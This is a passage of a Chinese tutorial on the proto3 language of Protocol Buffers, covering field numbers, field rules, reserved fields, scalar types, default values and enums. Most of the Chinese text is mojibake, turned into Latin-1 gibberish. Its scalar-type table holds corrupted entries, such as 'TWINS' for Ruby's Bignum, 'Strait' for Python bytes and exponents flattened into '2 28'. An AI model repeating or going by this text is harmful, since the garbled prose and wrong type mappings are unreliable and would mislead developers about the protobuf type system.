¼å¼](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fencoding)ä¸­è¯†åˆ«å„ä¸ªå­—æ®µçš„ï¼Œä¸€æ—¦å¼€å§‹ä½¿ç”¨å°±ä¸èƒ½å¤Ÿå†æ”¹å˜ã€‚æ³¨ï¼š[1,15]ä¹‹å†…çš„æ ‡è¯†å·åœ¨ç¼–ç çš„æ—¶å€™ä¼šå ç”¨ä¸€ä¸ªå­—èŠ‚ã€‚[16,2047]ä¹‹å†…çš„æ ‡è¯†å·åˆ™å ç”¨2ä¸ªå­—èŠ‚ã€‚æ‰€ä»¥åº”è¯¥ä¸ºé‚£äº›é¢‘ç¹å‡ºç°çš„æ¶ˆæ¯å…ƒç´ ä¿ç•™ [1,15]ä¹‹å†…çš„æ ‡è¯†å·ã€‚åˆ‡è®°ï¼šè¦ä¸ºå°†æ¥æœ‰å¯èƒ½æ·»åŠ çš„ã€é¢‘ç¹å‡ºç°çš„æ ‡è¯†å·é¢„ç•™ä¸€äº›æ ‡è¯†å·ã€‚\n\næœ€å°çš„æ ‡è¯†å·å¯ä»¥ä»1å¼€å§‹ï¼Œæœ€å¤§åˆ°2^29 - 1, or 536,870,911ã€‚ä¸å¯ä»¥ä½¿ç”¨å…¶ä¸­çš„[19000ï¼19999]çš„æ ‡è¯†å·ï¼Œ Protobufåè®®å®ç°ä¸­å¯¹è¿™äº›è¿›è¡Œäº†é¢„ç•™ã€‚å¦‚æœéè¦åœ¨.protoæ–‡ä»¶ä¸­ä½¿ç”¨è¿™äº›é¢„ç•™æ ‡è¯†å·ï¼Œç¼–è¯‘æ—¶å°±ä¼šæŠ¥è­¦ã€‚\n\n\n\n##### 1.3 æŒ‡å®šå­—æ®µè§„åˆ™\n\næ¶ˆæ¯å­—æ®µå¯ä»¥æ˜¯ä»¥ä¸‹ä¹‹ä¸€ï¼š\n\n- å•æ•°ï¼šæ ¼å¼è‰¯å¥½çš„æ¶ˆæ¯å¯ä»¥åŒ…å«è¯¥å­—æ®µä¸­çš„é›¶ä¸ªæˆ–ä¸€ä¸ªï¼ˆä½†ä¸è¶…è¿‡ä¸€ä¸ªï¼‰ã€‚\n- `repeated`ï¼šæ­¤å­—æ®µå¯ä»¥åœ¨æ ¼å¼è‰¯å¥½çš„æ¶ˆæ¯ä¸­é‡å¤ä»»æ„æ¬¡æ•°ï¼ˆåŒ…æ‹¬é›¶ï¼‰ã€‚å°†ä¿ç•™é‡å¤å€¼çš„é¡ºåºã€‚åœ¨proto3ä¸­ï¼Œ`repeated`æ•°å­—ç±»å‹çš„å­—æ®µé»˜è®¤ä½¿ç”¨`packed`ç¼–ç ã€‚`packed`æ‚¨å¯ä»¥åœ¨[åè®®ç¼“å†²åŒºç¼–ç ä¸­](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fencoding.html%23packed)æ‰¾åˆ°æœ‰å…³ç¼–ç çš„æ›´å¤šä¿¡æ¯ã€‚\n\n+ é™å®šä¿®é¥°ç¬¦åŒ…å« required\\optional\\repeated\n\n  + Required: è¡¨ç¤ºæ˜¯ä¸€ä¸ªå¿…é¡»å­—æ®µï¼Œå¿…é¡»ç›¸å¯¹äºå‘é€æ–¹ï¼Œåœ¨å‘é€æ¶ˆæ¯ä¹‹å‰å¿…é¡»è®¾ç½®è¯¥å­—æ®µçš„å€¼ï¼Œå¯¹äºæ¥æ”¶æ–¹ï¼Œå¿…é¡»èƒ½å¤Ÿè¯†åˆ«è¯¥å­—æ®µçš„æ„æ€ã€‚å‘é€ä¹‹å‰æ²¡æœ‰è®¾ç½®requiredå­—æ®µæˆ–è€…æ— æ³•è¯†åˆ«requiredå­—æ®µéƒ½ä¼šå¼•å‘ç¼–è§£ç å¼‚å¸¸ï¼Œå¯¼è‡´æ¶ˆæ¯è¢«ä¸¢å¼ƒã€‚\n\n  + Optionalï¼šè¡¨ç¤ºæ˜¯ä¸€ä¸ªå¯é€‰å­—æ®µï¼Œå¯é€‰å¯¹äºå‘é€æ–¹ï¼Œåœ¨å‘é€æ¶ˆæ¯æ—¶ï¼Œå¯ä»¥æœ‰é€‰æ‹©æ€§çš„è®¾ç½®æˆ–è€…ä¸è®¾ç½®è¯¥å­—æ®µçš„å€¼ã€‚å¯¹äºæ¥æ”¶æ–¹ï¼Œå¦‚æœèƒ½å¤Ÿè¯†åˆ«å¯é€‰å­—æ®µå°±è¿›è¡Œç›¸åº”çš„å¤„ç†ï¼Œå¦‚æœæ— æ³•è¯†åˆ«ï¼Œåˆ™å¿½ç•¥è¯¥å­—æ®µï¼Œæ¶ˆæ¯ä¸­çš„å…¶å®ƒå­—æ®µæ­£å¸¸å¤„ç†ã€‚---å› ä¸ºoptionalå­—æ®µçš„ç‰¹æ€§ï¼Œå¾ˆå¤šæ¥å£åœ¨å‡çº§ç‰ˆæœ¬ä¸­éƒ½æŠŠåæ¥æ·»åŠ çš„å­—æ®µéƒ½ç»Ÿä¸€çš„è®¾ç½®ä¸ºoptionalå­—æ®µï¼Œè¿™æ ·è€çš„ç‰ˆæœ¬æ— éœ€å‡çº§ç¨‹åºä¹Ÿå¯ä»¥æ­£å¸¸çš„ä¸æ–°çš„è½¯ä»¶è¿›è¡Œé€šä¿¡ï¼Œåªä¸è¿‡æ–°çš„å­—æ®µæ— æ³•è¯†åˆ«è€Œå·²ï¼Œå› ä¸ºå¹¶ä¸æ˜¯æ¯ä¸ªèŠ‚ç‚¹éƒ½éœ€è¦æ–°çš„åŠŸèƒ½ï¼Œå› æ­¤å¯ä»¥åšåˆ°æŒ‰éœ€å‡çº§å’Œå¹³æ»‘è¿‡æ¸¡ã€‚\n\n  + Repeatedï¼šè¡¨ç¤ºè¯¥å­—æ®µå¯ä»¥åŒ…å«0~Nä¸ªå…ƒç´ ã€‚å…¶ç‰¹æ€§å’Œoptionalä¸€æ ·ï¼Œä½†æ˜¯æ¯ä¸€æ¬¡å¯ä»¥åŒ…å«å¤šä¸ªå€¼ã€‚å¯ä»¥çœ‹ä½œæ˜¯åœ¨ä¼ é€’ä¸€ä¸ªæ•°ç»„çš„å€¼ã€‚\n\n\n\n##### 1.4 æ·»åŠ æ›´å¤šæ¶ˆæ¯ç±»å‹\n\nå¯ä»¥åœ¨å•ä¸ª`.proto`æ–‡ä»¶ä¸­å®šä¹‰å¤šç§æ¶ˆæ¯ç±»å‹ã€‚å¦‚æœè¦å®šä¹‰å¤šä¸ªç›¸å…³æ¶ˆæ¯ï¼Œè¿™å¾ˆæœ‰ç”¨  \n\nä¾‹å¦‚ï¼Œå¦‚æœè¦å®šä¹‰ä¸`SearchResponse`æ¶ˆæ¯ç±»å‹å¯¹åº”çš„å›å¤æ¶ˆæ¯æ ¼å¼ï¼Œå¯ä»¥å°†å…¶æ·»åŠ åˆ°ç›¸åŒçš„æ¶ˆæ¯`.proto`ï¼š\n\n```protobuf\nmessage SearchRequest {\n  string query = 1;\n  int32 page_number = 2;\n  int32 result_per_page = 3;\n}\n\nmessage SearchResponse {\n ...\n}\n```\n\n\n\n##### 1.5 æ·»åŠ æ³¨é‡Š\n\nè¦ä¸º`.proto`æ–‡ä»¶æ·»åŠ æ³¨é‡Šï¼Œè¯·ä½¿ç”¨C / C ++ - æ ·å¼`//`å’Œ`/* ... */`è¯­æ³•ã€‚\n\n```protobuf\n/* SearchRequestè¡¨ç¤ºæœç´¢æŸ¥è¯¢ï¼Œå¸¦æœ‰åˆ†é¡µé€‰é¡¹\n *è¡¨æ˜å“åº”ä¸­åŒ…å«å“ªäº›ç»“æœã€‚*/\n\nmessage SearchRequest {\n  string query = 1;\n  int32 page_number = 2; //æˆ‘ä»¬æƒ³è¦å“ªä¸ªé¡µç ï¼Ÿ\n  int32 result_per_page = 3; //æ¯é¡µè¿”å›çš„ç»“æœæ•°ã€‚\n}\n```\n\n\n\n##### 1.6 ä¿ç•™å­—æ®µ\n\nå¦‚æœé€šè¿‡å®Œå…¨åˆ é™¤å­—æ®µæˆ–å°†å…¶æ³¨é‡Šæ¥[æ›´æ–°](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto3%23updating)æ¶ˆæ¯ç±»å‹ï¼Œåˆ™æœªæ¥ç”¨æˆ·å¯ä»¥åœ¨å¯¹ç±»å‹è¿›è¡Œè‡ªå·±çš„æ›´æ–°æ—¶é‡ç”¨å­—æ®µç¼–å·ã€‚\n\nå¦‚æœä»¥ååŠ è½½ç›¸åŒçš„æ—§ç‰ˆæœ¬ï¼Œè¿™å¯èƒ½ä¼šå¯¼è‡´ä¸¥é‡é—®é¢˜`.proto`ï¼ŒåŒ…æ‹¬æ•°æ®æŸåï¼Œéšç§é”™è¯¯ç­‰ã€‚ç¡®ä¿ä¸ä¼šå‘ç”Ÿè¿™ç§æƒ…å†µçš„ä¸€ç§æ–¹æ³•æ˜¯æŒ‡å®šå·²åˆ é™¤å­—æ®µçš„å­—æ®µç¼–å·ï¼ˆå’Œ/æˆ–åç§°ï¼Œè¿™ä¹Ÿå¯èƒ½å¯¼è‡´JSONåºåˆ—åŒ–é—®é¢˜ï¼‰`reserved`ã€‚å¦‚æœå°†æ¥çš„ä»»ä½•ç”¨æˆ·å°è¯•ä½¿ç”¨è¿™äº›å­—æ®µæ ‡è¯†ç¬¦ï¼Œåè®®ç¼“å†²ç¼–è¯‘å™¨å°†ä¼šæŠ±æ€¨ã€‚\n\n```protobuf\nmessage Foo {\n  reserved 2, 15, 9 to 11;\n  reserved \"foo\", \"bar\";\n}\n```\n\nè¯·æ³¨æ„ï¼Œæ‚¨ä¸èƒ½åœ¨åŒä¸€`reserved`è¯­å¥ä¸­æ··åˆå­—æ®µåç§°å’Œå­—æ®µç¼–å·ã€‚\n\n\n\n##### 1.7 ä½ çš„ç”Ÿæˆæ˜¯ä»€ä¹ˆ`.proto`ï¼Ÿ\n\nå½“æ‚¨åœ¨aä¸Šè¿è¡Œ[åè®®ç¼“å†²åŒºç¼–è¯‘å™¨](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto3%23generating)æ—¶`.proto`ï¼Œç¼–è¯‘å™¨ä¼šç”Ÿæˆæ‚¨æ‰€é€‰è¯­è¨€çš„ä»£ç ï¼Œæ‚¨éœ€è¦ä½¿ç”¨æ‚¨åœ¨æ–‡ä»¶ä¸­æè¿°çš„æ¶ˆæ¯ç±»å‹ï¼ŒåŒ…æ‹¬è·å–å’Œè®¾ç½®å­—æ®µå€¼ï¼Œå°†æ¶ˆæ¯åºåˆ—åŒ–ä¸ºè¾“å‡ºæµï¼Œå¹¶ä»è¾“å…¥æµè§£ææ‚¨çš„æ¶ˆæ¯ã€‚\n\n- å¯¹äº**C ++**ï¼Œç¼–è¯‘å™¨ä¼šä»æ¯ä¸ªæ–‡ä»¶ç”Ÿæˆä¸€ä¸ª`.h`å’Œä¸€ä¸ª`.cc`æ–‡ä»¶`.proto`ï¼Œå¹¶ä¸ºæ‚¨æ–‡ä»¶ä¸­æè¿°çš„æ¯ç§æ¶ˆæ¯ç±»å‹æä¾›ä¸€ä¸ªç±»ã€‚\n- å¯¹äº**Java**ï¼Œç¼–è¯‘å™¨ç”Ÿæˆä¸€ä¸ª`.java`æ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«æ¯ç§æ¶ˆæ¯ç±»å‹çš„ç±»ï¼Œä»¥åŠ`Builder`ç”¨äºåˆ›å»ºæ¶ˆæ¯ç±»å®ä¾‹çš„ç‰¹æ®Šç±»ã€‚\n- **Python**æœ‰ç‚¹ä¸åŒ - Pythonç¼–è¯‘å™¨ç”Ÿæˆä¸€ä¸ªæ¨¡å—ï¼Œå…¶ä¸­åŒ…å«æ¯ä¸ªæ¶ˆæ¯ç±»å‹çš„é™æ€æè¿°ç¬¦ï¼Œ`.proto`ç„¶åä¸*å…ƒç±»*ä¸€èµ·ä½¿ç”¨ï¼Œä»¥åœ¨è¿è¡Œæ—¶åˆ›å»ºå¿…è¦çš„Pythonæ•°æ®è®¿é—®ç±»ã€‚\n- å¯¹äº**Go**ï¼Œç¼–è¯‘å™¨ä¼šä¸º`.pb.go`æ–‡ä»¶ä¸­çš„æ¯ç§æ¶ˆæ¯ç±»å‹ç”Ÿæˆä¸€ä¸ªç±»å‹çš„æ–‡ä»¶ã€‚\n- å¯¹äº**Ruby**ï¼Œç¼–è¯‘å™¨ç”Ÿæˆä¸€ä¸ª`.rb`åŒ…å«æ¶ˆæ¯ç±»å‹çš„Rubyæ¨¡å—çš„æ–‡ä»¶ã€‚\n- å¯¹äº**Objective-C**ï¼Œç¼–è¯‘å™¨ä»æ¯ä¸ªæ–‡ä»¶ç”Ÿæˆä¸€ä¸ª`pbobjc.h`å’Œä¸€ä¸ª`pbobjc.m`æ–‡ä»¶`.proto`ï¼Œå…¶ä¸­åŒ…å«æ–‡ä»¶ä¸­æè¿°çš„æ¯ç§æ¶ˆæ¯ç±»å‹çš„ç±»ã€‚\n- å¯¹äº**Cï¼ƒ**ï¼Œç¼–è¯‘å™¨ä¼š`.cs`ä»æ¯ä¸ªæ–‡ä»¶ç”Ÿæˆä¸€ä¸ªæ–‡ä»¶`.proto`ï¼Œå…¶ä¸­åŒ…å«æ–‡ä»¶ä¸­æè¿°çš„æ¯ç§æ¶ˆæ¯ç±»å‹çš„ç±»ã€‚\n\næ‚¨å¯ä»¥æŒ‰ç…§æ‰€é€‰è¯­è¨€çš„æ•™ç¨‹ï¼ˆå³å°†æ¨å‡ºçš„proto3ç‰ˆæœ¬ï¼‰äº†è§£æœ‰å…³ä¸ºæ¯ç§è¯­è¨€ä½¿ç”¨APIçš„æ›´å¤šä¿¡æ¯ã€‚æœ‰å…³æ›´å¤šAPIè¯¦ç»†ä¿¡æ¯ï¼Œè¯·å‚é˜…ç›¸å…³[APIå‚è€ƒ](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Freference%2Foverview)ï¼ˆproto3ç‰ˆæœ¬å³å°†æ¨å‡ºï¼‰ã€‚\n\n\n\n### 2. æ ‡é‡å€¼ç±»å‹\n\næ ‡é‡æ¶ˆæ¯å­—æ®µå¯ä»¥å…·æœ‰ä»¥ä¸‹ç±»å‹ä¹‹ä¸€ - è¯¥è¡¨æ˜¾ç¤º`.proto`æ–‡ä»¶ä¸­æŒ‡å®šçš„ç±»å‹ï¼Œä»¥åŠè‡ªåŠ¨ç”Ÿæˆçš„ç±»ä¸­çš„ç›¸åº”ç±»å‹ï¼š\n\n| .proto type | notes                                                        | C ++ type | Java type   | Python type [2]  |  Go type         | Ruby type                    | C# type     | PHP type          |\n| ----------- | :----------------------------------------------------------- | --------- | ----------- | ---------------- | ------- | ---------------------------- | ----------- | ----------------- |\n| double      |                                                              | double    | double      | float            | float64 | float                        | double      | float             |\n| float       |                                                              | float     | float       | float            | FLOAT32 | float                        | float       | float             |\n| INT32       | ä½¿ç”¨å¯å˜é•¿åº¦ç¼–ç ã€‚ç¼–ç è´Ÿæ•°çš„æ•ˆç‡ä½ - å¦‚æœæ‚¨çš„å­—æ®µå¯èƒ½æœ‰è´Ÿå€¼ï¼Œè¯·æ”¹ç”¨sint32ã€‚ | INT32     | INT         | INT              | INT32   | Fixnum or Bignum (as needed) | INT         | Integer           |\n| Int64       | ä½¿ç”¨å¯å˜é•¿åº¦ç¼–ç ã€‚ç¼–ç è´Ÿæ•°çš„æ•ˆç‡ä½ - å¦‚æœæ‚¨çš„å­—æ®µå¯èƒ½æœ‰è´Ÿå€¼ï¼Œè¯·æ”¹ç”¨sint64ã€‚ | Int64     | long        | int / long [3]   | Int64   | TWINS                        | long        | Integer/string[5] |\n| UINT32      | ä½¿ç”¨å¯å˜é•¿åº¦ç¼–ç ã€‚                                           | UINT32    | int [1]     | int / long [3]   | UINT32  | Fixnum or Bignum (as needed) | UINT        | Integer           |\n| UINT64      | ä½¿ç”¨å¯å˜é•¿åº¦ç¼–ç ã€‚                                           | UINT64    | Long [1]    | int / long [3]   | UINT64  | TWINS                        | ULONG       | Integer/string[5] |\n| SINT32      | ä½¿ç”¨å¯å˜é•¿åº¦ç¼–ç ã€‚ç­¾åçš„intå€¼ã€‚è¿™äº›æ¯”å¸¸è§„int32æ›´æœ‰æ•ˆåœ°ç¼–ç è´Ÿæ•°ã€‚ | INT32     | INT         | INT              | INT32   | Fixnum or Bignum (as needed) | INT         | Integer           |\n| sint64      | ä½¿ç”¨å¯å˜é•¿åº¦ç¼–ç ã€‚ç­¾åçš„intå€¼ã€‚è¿™äº›æ¯”å¸¸è§„int64æ›´æœ‰æ•ˆåœ°ç¼–ç è´Ÿæ•°ã€‚ | Int64     | long        | int / long [3]   | Int64   | TWINS                        | long        | Integer/string[5] |\n| fixed32     | æ€»æ˜¯å››ä¸ªå­—èŠ‚ã€‚å¦‚æœå€¼é€šå¸¸å¤§äº2 28ï¼Œåˆ™æ¯”uint32æ›´æœ‰æ•ˆã€‚         | UINT32    | int [1]     | int / long [3]   | UINT32  | Fixnum or Bignum (as needed) | UINT        | Integer           |\n| fixed64     | æ€»æ˜¯å…«ä¸ªå­—èŠ‚ã€‚å¦‚æœå€¼é€šå¸¸å¤§äº2 56ï¼Œåˆ™æ¯”uint64æ›´æœ‰æ•ˆã€‚         | UINT64    | Long [1]    | int / long [3]   | UINT64  | TWINS                        | ULONG       | Integer/string[5] |\n| sfixed32    | æ€»æ˜¯å››ä¸ªå­—èŠ‚ã€‚                                               | INT32     | INT         | INT              | INT32   | Fixnum or Bignum (as needed) | INT         | Integer           |\n| sfixed64    | æ€»æ˜¯å…«ä¸ªå­—èŠ‚ã€‚                                               | Int64     | long        | int / long [3]   | Int64   | TWINS                        | long        | Integer/string[5] |\n| Boolean     |                                                              | Boolean   | Boolean     | Boolean          | Boolean | TrueClass / FalseClass       | Boolean     | Boolean           |\n| string      | å­—ç¬¦ä¸²å¿…é¡»å§‹ç»ˆåŒ…å«UTF-8ç¼–ç æˆ–7ä½ASCIIæ–‡æœ¬ã€‚                  | string    | string      | str / unicode[4] | string  | String (UTF-8)               | string      | string            |\n| byte        | å¯ä»¥åŒ…å«ä»»æ„å­—èŠ‚åºåˆ—ã€‚                                       | string    | Byte string | Strait           | []byte  | String (ASCII-8BIT)          | Byte string | string            |\n\n\n\nåœ¨[åè®®ç¼“å†²åŒºç¼–ç ä¸­](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fencoding)åºåˆ—åŒ–æ¶ˆæ¯æ—¶ï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°æœ‰å…³å¦‚ä½•ç¼–ç è¿™äº›ç±»å‹çš„æ›´å¤šä¿¡æ¯ã€‚\n\n[1]åœ¨Javaä¸­ï¼Œæ— ç¬¦å·çš„32ä½å’Œ64ä½æ•´æ•°ä½¿ç”¨å®ƒä»¬çš„å¸¦ç¬¦å·å¯¹åº”è¡¨ç¤ºï¼Œæœ€é«˜ä½åªæ˜¯å­˜å‚¨åœ¨ç¬¦å·ä½ä¸­ã€‚\n\n[2]åœ¨æ‰€æœ‰æƒ…å†µä¸‹ï¼Œå°†å€¼è®¾ç½®ä¸ºå­—æ®µå°†æ‰§è¡Œç±»å‹æ£€æŸ¥ä»¥ç¡®ä¿å…¶æœ‰æ•ˆã€‚\n\n[3] 64ä½æˆ–æ— ç¬¦å·32ä½æ•´æ•°åœ¨è§£ç æ—¶å§‹ç»ˆè¡¨ç¤ºä¸ºlongï¼Œä½†å¦‚æœåœ¨è®¾ç½®å­—æ®µæ—¶ç»™å‡ºintï¼Œåˆ™å¯ä»¥ä¸ºintã€‚åœ¨æ‰€æœ‰æƒ…å†µä¸‹ï¼Œè¯¥å€¼å¿…é¡»é€‚åˆè®¾ç½®æ—¶è¡¨ç¤ºçš„ç±»å‹ã€‚è§[2]ã€‚\n\n[4] Pythonå­—ç¬¦ä¸²åœ¨è§£ç æ—¶è¡¨ç¤ºä¸ºunicodeï¼Œä½†å¦‚æœç»™å‡ºäº†ASCIIå­—ç¬¦ä¸²ï¼Œåˆ™å¯ä»¥æ˜¯strï¼ˆè¿™å¯èƒ½ä¼šå‘ç”Ÿå˜åŒ–ï¼‰ã€‚\n\n[5] Integerç”¨äº64ä½è®¡ç®—æœºï¼Œå­—ç¬¦ä¸²ç”¨äº32ä½è®¡ç®—æœºã€‚\n\n\n\n### 3. é»˜è®¤å€¼\n\nè§£ææ¶ˆæ¯æ—¶ï¼Œå¦‚æœç¼–ç æ¶ˆæ¯ä¸åŒ…å«ç‰¹å®šçš„å•æ•°å…ƒç´ ï¼Œåˆ™è§£æå¯¹è±¡ä¸­çš„ç›¸åº”å­—æ®µå°†è®¾ç½®ä¸ºè¯¥å­—æ®µçš„é»˜è®¤å€¼ã€‚è¿™äº›é»˜è®¤å€¼æ˜¯ç‰¹å®šäºç±»å‹çš„ï¼š\n\n- å¯¹äºå­—ç¬¦ä¸²ï¼Œé»˜è®¤å€¼ä¸ºç©ºå­—ç¬¦ä¸²ã€‚\n- å¯¹äºå­—èŠ‚ï¼Œé»˜è®¤å€¼ä¸ºç©ºå­—èŠ‚ã€‚\n- å¯¹äºboolsï¼Œé»˜è®¤å€¼ä¸ºfalseã€‚\n- å¯¹äºæ•°å­—ç±»å‹ï¼Œé»˜è®¤å€¼ä¸ºé›¶ã€‚\n- å¯¹äº[æšä¸¾](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto3%23enum)ï¼Œé»˜è®¤å€¼æ˜¯ç¬¬**ä¸€ä¸ªå®šä¹‰çš„æšä¸¾å€¼**ï¼Œè¯¥**å€¼**å¿…é¡»ä¸º0ã€‚\n- å¯¹äºæ¶ˆæ¯å­—æ®µï¼Œæœªè®¾ç½®è¯¥å­—æ®µã€‚å®ƒçš„ç¡®åˆ‡å€¼å–å†³äºè¯­è¨€ã€‚æœ‰å…³è¯¦ç»†ä¿¡æ¯ï¼Œ è¯·å‚é˜…[ç”Ÿæˆçš„ä»£ç æŒ‡](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Freference%2Foverview)\n\né‡å¤å­—æ®µçš„é»˜è®¤å€¼ä¸ºç©ºï¼ˆé€šå¸¸æ˜¯ç›¸åº”è¯­è¨€çš„ç©ºåˆ—è¡¨ï¼‰ã€‚\n\nè¯·æ³¨æ„ï¼Œå¯¹äºæ ‡é‡æ¶ˆæ¯å­—æ®µï¼Œä¸€æ—¦è§£æäº†æ¶ˆæ¯ï¼Œå°±æ— æ³•ç¡®å®šå­—æ®µæ˜¯å¦æ˜¾å¼è®¾ç½®ä¸ºé»˜è®¤å€¼ï¼ˆä¾‹å¦‚ï¼Œæ˜¯å¦è®¾ç½®äº†å¸ƒå°”å€¼`false`ï¼‰æˆ–è€…æ ¹æœ¬æ²¡æœ‰è®¾ç½®ï¼šæ‚¨åº”è¯¥è®°ä½è¿™ä¸€ç‚¹åœ¨å®šä¹‰æ¶ˆæ¯ç±»å‹æ—¶ã€‚ä¾‹å¦‚ï¼Œ`false`å¦‚æœæ‚¨ä¸å¸Œæœ›é»˜è®¤æƒ…å†µä¸‹ä¹Ÿå‘ç”Ÿè¿™ç§è¡Œä¸ºï¼Œé‚£ä¹ˆåœ¨è®¾ç½®ä¸ºæ—¶ï¼Œæ²¡æœ‰ä¸€ä¸ªå¸ƒå°”å€¼å¯ä»¥å¯ç”¨æŸäº›è¡Œä¸ºã€‚è¿˜è¦æ³¨æ„çš„æ˜¯ï¼Œå¦‚æœä¸€ä¸ªæ ‡æ¶ˆæ¯å­—æ®µ**è¢«**è®¾ç½®ä¸ºé»˜è®¤å€¼ï¼Œè¯¥å€¼å°†ä¸ä¼šåœ¨ç”µçº¿ä¸Šè¿è½½ã€‚\n\næœ‰å…³é»˜è®¤å€¼å¦‚ä½•åœ¨ç”Ÿæˆçš„ä»£ç ä¸­å·¥ä½œçš„æ›´å¤šè¯¦ç»†ä¿¡æ¯ï¼Œè¯·å‚é˜…æ‰€é€‰è¯­è¨€çš„[ç”Ÿæˆä»£ç æŒ‡å—](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Freference%2Foverview)ã€‚\n\n### 4. æšä¸¾\n\nåœ¨å®šä¹‰æ¶ˆæ¯ç±»å‹æ—¶ï¼Œæ‚¨å¯èƒ½å¸Œæœ›å…¶ä¸­ä¸€ä¸ªå­—æ®µåªæœ‰ä¸€ä¸ªé¢„å®šä¹‰çš„å€¼åˆ—è¡¨ã€‚ä¾‹å¦‚ï¼Œå‡è®¾ä½ æƒ³æ·»åŠ ä¸€ä¸ª `corpus`å­—æ®µæ¯ä¸ª`SearchRequest`ï¼Œå…¶ä¸­è¯­æ–™åº“å¯ä»¥ `UNIVERSAL`ï¼Œ`WEB`ï¼Œ`IMAGES`ï¼Œ`LOCAL`ï¼Œ`NEWS`ï¼Œ`PRODUCTS`æˆ–`VIDEO`ã€‚æ‚¨å¯ä»¥éå¸¸ç®€å•åœ°é€šè¿‡`enum`ä¸ºæ¯ä¸ªå¯èƒ½çš„å€¼æ·»åŠ ä¸€ä¸ªå¸¸é‡æ¥å®šä¹‰æ¶ˆæ¯å®šä¹‰ã€‚\n\nåœ¨ä¸‹é¢çš„ç¤ºä¾‹ä¸­ï¼Œæˆ‘ä»¬æ·»åŠ äº†ä¸€ä¸ªå¸¦æœ‰æ‰€æœ‰å¯èƒ½å€¼çš„`enum`è°ƒç”¨`Corpus`ï¼Œä»¥åŠä¸€ä¸ªç±»å‹çš„å­—æ®µ`Corpus`ï¼š\n\n```protobuf\nmessage SearchRequest {\n  string query = 1;\n  int32 page_number = 2;\n  int32 result_per_page = 3;\n  enum Corpus {\n    UNIVERSAL = 0;\n    WEB = 1;\n    IMAGES = 2;\n    LOCAL = 3;\n    NEWS = 4;\n    PRODUCTS = 5;\n    VIDEO = 6;\n  }\n  Corpus corpus = 4;\n}\n```\n\nå¦‚æ‚¨æ‰€è§ï¼Œ`Corpus`æšä¸¾çš„ç¬¬ä¸€ä¸ªå¸¸é‡æ˜ å°„ä¸ºé›¶ï¼šæ¯ä¸ªæšä¸¾å®šä¹‰**å¿…é¡»**åŒ…å«ä¸€ä¸ªæ˜ å°„åˆ°é›¶çš„å¸¸é‡ä½œä¸ºå…¶ç¬¬ä¸€ä¸ªå…ƒç´ ã€‚è¿™æ˜¯å› ä¸ºï¼š\n\n- å¿…é¡»æœ‰ä¸€ä¸ªé›¶å€¼ï¼Œä»¥ä¾¿æˆ‘ä»¬å¯ä»¥ä½¿ç”¨0ä½œä¸ºæ•°å­—[é»˜è®¤å€¼](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto3%23default)ã€‚\n- é›¶å€¼å¿…é¡»æ˜¯ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œä»¥ä¾¿ä¸[proto2](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto)è¯­ä¹‰å…¼å®¹ï¼Œå…¶ä¸­ç¬¬ä¸€ä¸ªæšä¸¾å€¼å§‹ç»ˆæ˜¯é»˜è®¤å€¼ã€‚\n\n\n\næ‚¨å¯ä»¥é€šè¿‡ä¸ºä¸åŒçš„æšä¸¾å¸¸é‡æŒ‡å®šç›¸åŒçš„å€¼æ¥å®šä¹‰åˆ«åã€‚ä¸ºæ­¤ï¼Œæ‚¨éœ€è¦å°†`allow_alias`é€‰é¡¹è®¾ç½®ä¸º`true`ï¼Œå¦åˆ™åè®®ç¼–è¯‘å™¨å°†åœ¨æ‰¾åˆ°åˆ«åæ—¶ç”Ÿæˆé”™è¯¯æ¶ˆæ¯ã€‚\n\n```protobuf\nenum EnumAllowingAlias {\n  option allow_alias = true;\n  UNKNOWN = 0;\n  STARTED = 1;\n  RUNNING = 1;\n}\nenum EnumNotAllowingAlias {\n  UNKNOWN = 0;\n  STARTED = 1;\n  // RUNNING = 1;  // Uncommenting this line will cause a compile error inside Google and a warning message outside.\n}\n```\n\næšä¸¾å™¨å¸¸é‡å¿…é¡»åœ¨32ä½æ•´æ•°èŒƒå›´å†…ã€‚ç”±äº`enum`å€¼åœ¨çº¿ä¸Šä½¿ç”¨[varintç¼–ç ](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fencoding)ï¼Œå› æ­¤è´Ÿå€¼æ•ˆç‡ä½ï¼Œå› æ­¤ä¸å»ºè®®ä½¿ç”¨ã€‚æ‚¨å¯ä»¥`enum`åœ¨æ¶ˆæ¯å®šä¹‰ä¸­å®šä¹‰sï¼Œå¦‚ä¸Šä¾‹æ‰€ç¤ºï¼Œ`enum`ä¹Ÿå¯ä»¥åœ¨å¤–éƒ¨å®šä¹‰ - è¿™äº›å¯ä»¥åœ¨`.proto`æ–‡ä»¶çš„ä»»ä½•æ¶ˆæ¯å®šä¹‰ä¸­é‡ç”¨ã€‚æ‚¨è¿˜å¯ä»¥ä½¿ç”¨`enum`è¯­æ³•å°†ä¸€ä¸ªæ¶ˆæ¯ä¸­å£°æ˜çš„ç±»å‹ç”¨ä½œå¦ä¸€ä¸ªæ¶ˆæ¯ä¸­çš„å­—æ®µç±»å‹ã€‚ `*MessageType*.*EnumType*`\n\nå½“ä½ åœ¨`.proto`ä½¿ç”¨açš„åè®®ç¼“å†²ç¼–è¯‘å™¨ä¸Šè¿è¡Œæ—¶`enum`ï¼Œç”Ÿæˆçš„ä»£ç 